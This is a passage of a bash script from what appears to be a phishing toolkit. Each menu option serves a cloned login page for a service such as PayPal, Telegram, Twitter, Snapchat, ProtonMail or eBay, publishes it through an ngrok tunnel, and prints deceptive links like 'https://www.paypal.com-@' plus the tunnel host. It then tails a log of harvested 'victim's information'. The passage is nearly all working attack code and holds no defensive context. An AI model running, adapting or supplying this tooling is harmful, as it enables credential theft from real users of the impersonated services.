                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.zomato.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                elif [ $option = 18 ] || [ $option = 18 ]
            then
                          cd sites/
                          cd phonepay/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.phonepe.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                elif [ $option = 19 ] || [ $option = 19 ]
            then
                          cd sites/
                          cd paypal/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.paypal.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 
                break;
                elif [ $option = 20 ] || [ $option = 20 ]
            then
                          cd sites/
                          cd telegram/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://web.telegram.org-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt 

                break;
                elif [ $option = 21 ] || [ $option = 21 ]
            then
                          cd sites/
                          cd twitter/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://twitter.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 22 ] || [ $option = 22 ]
            then
                          cd sites/
                          cd flipcart/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.flipkart.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 23 ] || [ $option = 23 ]
            then
                          cd sites/
                          cd wordpress/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://wordpress.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 24 ] || [ $option = 24 ]
            then
                          cd sites/
                          cd snapchat/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://accounts.snapchat.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 25 ] || [ $option = 25 ]
            then
                          cd sites/
                          cd protonmail/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://protonmail.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 26 ] || [ $option = 26 ]
            then
               
                          cd sites/
                          cd stackoverflow/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://stackoverflow.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 27 ] || [ $option = 27 ]
            then

                          cd sites/
                          cd ebay/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://in.ebay.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 28 ] || [ $option = 28 ]
            then
                          cd sites/
                          cd twitch/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.twitch.tv-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 29 ] || [ $option = 29 ]
            then
                          cd sites/
                          cd ajio/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.ajio.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 30 ] || [ $option = 30 ]
            then
                          cd sites/
                          cd cryptocurrency/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://google.com-login-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 31 ] || [ $option = 31 ]
            then
                          cd sites/
                          cd mobikwik/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.mobikwik.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;
                elif [ $option = 32 ] || [ $option = 32 ]
            then
                          cd sites/
                          cd pinterest/
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                          sleep 3
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          sleep 9
                          echo ""
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                          if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                          then
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.mobikwik.com-@$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          else
                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                          fi
                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                          if [[ -e log.txt ]]; then
                          > log.txt
                          fi 
                          echo ""
                          tail -f log.txt

                break;

                elif [ $option = 0 ]
            then
                     echo
                            exit
        break;

                else

                 echo
                 echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Invalid option Try Again!!"${WHITE}
                 sleep 2
                         exit
                 fi
                         done
